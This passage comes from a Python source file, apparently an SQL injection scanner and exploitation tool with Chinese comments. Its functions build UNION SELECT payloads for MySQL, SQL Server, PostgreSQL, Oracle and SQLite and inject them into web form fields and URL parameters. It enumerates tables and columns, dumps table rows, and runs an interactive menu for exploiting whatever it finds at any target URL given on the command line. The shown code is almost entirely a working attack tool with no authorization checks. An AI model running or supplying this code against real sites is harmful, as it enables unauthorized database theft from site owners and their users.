                res = self.session.post(form_data['url'], data=data, timeout=10)
            else:
                res = self.session.get(form_data['url'], params=data, timeout=10)
            
            tables = self.extract_union_data_list(res.text, 0)
            return tables if tables else None
        
        except requests.RequestException:
            return None
    
    def get_url_tables(self, url_data, columns, db_type):
        """
        获取URL参数注入的表名
        :param url_data: URL参数详情
        :param columns: 列数
        :param db_type: 数据库类型
        :return: 表名列表或None
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
        elif db_type.lower() == "sql server":
            query = "SELECT table_name FROM information_schema.tables"
        elif db_type.lower() == "postgresql":
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema')"
        elif db_type.lower() == "oracle":
            query = "SELECT table_name FROM all_tables"
        elif db_type.lower() == "sqlite":
            query = "SELECT name FROM sqlite_master WHERE type='table'"
        else:
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        parsed_url = urlparse(url_data['url'])
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        test_params = original_params.copy()
        test_params[url_data['param']] = f"1' UNION SELECT {union_select}{comment}"
        query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
        test_url = f"{base_url}?{query_string}"
        
        try:
            res = self.session.get(test_url, timeout=10)
            tables = self.extract_union_data_list(res.text, 0)
            return tables if tables else None
        
        except requests.RequestException:
            return None
    
    def get_columns(self, form_data, columns, table, db_type):
        """
        获取表的列名
        :param form_data: 表单详情
        :param columns: 列数
        :param table: 表名
        :param db_type: 数据库类型
        :return: 列名列表或None
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "sql server":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "postgresql":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "oracle":
            query = f"SELECT column_name FROM all_tab_columns WHERE table_name='{table}'"
        elif db_type.lower() == "sqlite":
            query = f"SELECT name FROM pragma_table_info('{table}')"
        else:
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        data = {}
        for input in form_data['inputs']:
            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                data[input['name']] = f"1' UNION SELECT {union_select}{comment}"
            else:
                data[input['name']] = input.get('value', '')
        
        try:
            if form_data['method'] == 'post':
                res = self.session.post(form_data['url'], data=data, timeout=10)
            else:
                res = self.session.get(form_data['url'], params=data, timeout=10)
            
            cols = self.extract_union_data_list(res.text, 0)
            return cols if cols else None
        
        except requests.RequestException:
            return None
    
    def get_url_columns(self, url_data, columns, table, db_type):
        """
        获取URL参数注入的列名
        :param url_data: URL参数详情
        :param columns: 列数
        :param table: 表名
        :param db_type: 数据库类型
        :return: 列名列表或None
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "sql server":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "postgresql":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"
        elif db_type.lower() == "oracle":
            query = f"SELECT column_name FROM all_tab_columns WHERE table_name='{table}'"
        elif db_type.lower() == "sqlite":
            query = f"SELECT name FROM pragma_table_info('{table}')"
        else:
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        parsed_url = urlparse(url_data['url'])
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        test_params = original_params.copy()
        test_params[url_data['param']] = f"1' UNION SELECT {union_select}{comment}"
        query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
        test_url = f"{base_url}?{query_string}"
        
        try:
            res = self.session.get(test_url, timeout=10)
            cols = self.extract_union_data_list(res.text, 0)
            return cols if cols else None
        
        except requests.RequestException:
            return None
    
    def get_table_data(self, form_data, columns, table, table_columns, db_type):
        """
        获取表数据
        :param form_data: 表单详情
        :param columns: 列数
        :param table: 表名
        :param table_columns: 表的列名列表
        :param db_type: 数据库类型
        :return: 表数据(行列表)或None
        """
        # 构建查询 - 限制返回的行数以避免过大响应
        limit = 10  # 限制每次获取10行数据
        cols = ",".join(table_columns)
        query = f"SELECT {cols} FROM {table} LIMIT {limit}"
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        data = {}
        for input in form_data['inputs']:
            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                data[input['name']] = f"1' UNION SELECT {union_select}{comment}"
            else:
                data[input['name']] = input.get('value', '')
        
        try:
            if form_data['method'] == 'post':
                res = self.session.post(form_data['url'], data=data, timeout=10)
            else:
                res = self.session.get(form_data['url'], params=data, timeout=10)
            
            # 提取每列的数据
            data_rows = []
            for i in range(len(table_columns)):
                col_data = self.extract_union_data_list(res.text, i)
                if col_data:
                    data_rows.append(col_data)
            
            # 转置数据，使每行对应一条记录
            if data_rows:
                return list(zip(*data_rows))
            return None
        
        except requests.RequestException:
            return None
    
    def get_url_table_data(self, url_data, columns, table, table_columns, db_type):
        """
        获取URL参数注入的表数据
        :param url_data: URL参数详情
        :param columns: 列数
        :param table: 表名
        :param table_columns: 表的列名列表
        :param db_type: 数据库类型
        :return: 表数据(行列表)或None
        """
        # 构建查询 - 限制返回的行数以避免过大响应
        limit = 10  # 限制每次获取10行数据
        cols = ",".join(table_columns)
        query = f"SELECT {cols} FROM {table} LIMIT {limit}"
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        parsed_url = urlparse(url_data['url'])
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        test_params = original_params.copy()
        test_params[url_data['param']] = f"1' UNION SELECT {union_select}{comment}"
        query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
        test_url = f"{base_url}?{query_string}"
        
        try:
            res = self.session.get(test_url, timeout=10)
            
            # 提取每列的数据
            data_rows = []
            for i in range(len(table_columns)):
                col_data = self.extract_union_data_list(res.text, i)
                if col_data:
                    data_rows.append(col_data)
            
            # 转置数据，使每行对应一条记录
            if data_rows:
                return list(zip(*data_rows))
            return None
        
        except requests.RequestException:
            return None
    
    def build_union_select(self, column_count, payloads, db_type=None):
        """
        构建UNION SELECT语句
        :param column_count: 列数
        :param payloads: 要插入的查询列表
        :param db_type: 数据库类型(用于特殊处理)
        :return: UNION SELECT语句字符串
        """
        parts = []
        for i in range(column_count):
            if i < len(payloads):
                parts.append(payloads[i])
            else:
                parts.append("null")
        
        # Oracle需要FROM子句
        if db_type and db_type.lower() == "oracle" and column_count > 0:
            return ",".join(parts) + " FROM dual"
        
        return ",".join(parts)
    
    def extract_union_data(self, text, index):
        """
        从UNION SELECT响应中提取数据
        :param text: 响应文本
        :param index: 要提取的数据索引
        :return: 提取的数据或None
        """
        # 改进的正则表达式，匹配更广泛的HTML标签内容
        pattern = re.compile(r'<(td|th|div|span|p|li)[^>]*>(.*?)</(td|th|div|span|p|li)>', re.IGNORECASE | re.DOTALL)
        matches = pattern.findall(text)
        if matches and index < len(matches):
            # 提取内容并清理HTML标签
            content = matches[index][1]
            clean_content = re.sub(r'<[^>]+>', '', content).strip()
            return clean_content if clean_content else None
        return None
    
    def extract_union_data_list(self, text, index):
        """
        从UNION SELECT响应中提取数据列表
        :param text: 响应文本
        :param index: 要提取的数据索引
        :return: 数据列表或None
        """
        # 改进的正则表达式，匹配更广泛的HTML标签内容
        pattern = re.compile(r'<(td|th|div|span|p|li)[^>]*>(.*?)</(td|th|div|span|p|li)>', re.IGNORECASE | re.DOTALL)
        matches = pattern.findall(text)
        if matches:
            # 假设数据是按列分组的
            data = []
            group_size = max(index + 1, 3)  # 假设至少有3列
            for i in range(index, len(matches), group_size):
                if i < len(matches):
                    content = matches[i][1]
                    clean_content = re.sub(r'<[^>]+>', '', content).strip()
                    if clean_content and clean_content.lower() not in ['null', '']:
                        data.append(clean_content)
            return data if data else None
        return None

def display_exploit_results(results):
    """
    以表格形式显示利用结果
    :param results: 利用结果数据
    """
    if not results:
        print("\n[-] 未获取到数据")
        return
    
    print("\n[+] 数据库信息:")
    info_table = PrettyTable()
    info_table.field_names = ["属性", "值"]
    info_table.add_row(["数据库名称", results['database_info'].get('database', '未知')])
    info_table.add_row(["当前用户", results['database_info'].get('user', '未知')])
    info_table.add_row(["数据库版本", results['database_info'].get('version', '未知')])
    print(info_table)
    
    print("\n[+] 表数据:")
    for table_name, table_data in results['tables'].items():
        print(f"\n表: {table_name}")
        
        if not table_data['data']:
            print("[-] 无数据")
            continue
        
        table = PrettyTable()
        table.field_names = table_data['columns']
        
        for row in table_data['data']:
            # 确保行数据与列数匹配
            if len(row) == len(table_data['columns']):
                table.add_row(row)
            else:
                # 如果数据不完整，只添加有效部分
                table.add_row(row[:len(table_data['columns'])])
        
        print(table)

def main():
    """
    主函数，处理命令行参数并启动扫描
    """
    parser = argparse.ArgumentParser(description='SQL注入检测与利用工具')
    parser.add_argument('url', help='目标URL')
    parser.add_argument('--proxy', help='使用代理(格式: http://127.0.0.1:8080)', default=None)
    args = parser.parse_args()
    
    # 设置代理(如果有)
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    else:
        proxies = None
    
    try:
        # 初始化扫描器
        scanner = SQLiScanner(args.url)
        if proxies:
            scanner.session.proxies = proxies
        
        # 开始扫描
        scanner.scan_for_sqli()
        
        # 如果没有发现漏洞，直接退出
        if not scanner.vulnerable_params and not scanner.vulnerable_urls:
            return
        
        # 询问是否要利用漏洞
        print("\n[?] 是否要利用发现的漏洞? (y/n)")
        choice = input("> ").lower()
        if choice != 'y':
            return
        
        # 显示可用的漏洞选项
        exploit_options = []
        print("\n[+] 选择要利用的漏洞:")
        
        if scanner.vulnerable_params:
            print("\n表单漏洞:")
            for i, vuln in enumerate(scanner.vulnerable_params, 1):
                params = ", ".join([f"{inp['name']}" for inp in vuln['inputs']])
                print(f"{i}. URL: {vuln['url']}, 方法: {vuln['method'].upper()}, 参数: {params}, 类型: {vuln['type']}")
            exploit_options.extend(scanner.vulnerable_params)
        
        if scanner.vulnerable_urls:
            print("\nURL参数漏洞:")
            offset = len(exploit_options) + 1
            for i, vuln in enumerate(scanner.vulnerable_urls, offset):
                print(f"{i}. URL: {vuln['url']}, 参数: {vuln['param']}, 类型: {vuln['type']}")
            exploit_options.extend(scanner.vulnerable_urls)
        
        # 处理用户选择
        while True:
            print("\n[?] 输入要利用的漏洞编号 (0退出):")
            try:
                choice = int(input("> "))
                if choice == 0:
                    break
                if choice < 1 or choice > len(exploit_options):
                    print("[-] 无效选择")
                    continue
                
                selected_vuln = exploit_options[choice - 1]
                results = scanner.exploit_vulnerability(selected_vuln)
                
                if results:
                    display_exploit_results(results)
                else:
                    print("[-] 利用失败，未能获取数据")
            
            except ValueError:
                print("[-] 请输入有效数字")
    
    except KeyboardInterrupt:
        print("\n[!] 用户中断操作")
    except Exception as e:
        print(f"[-] 发生错误: {str(e)}")

if __name__ == '__main__':
    main()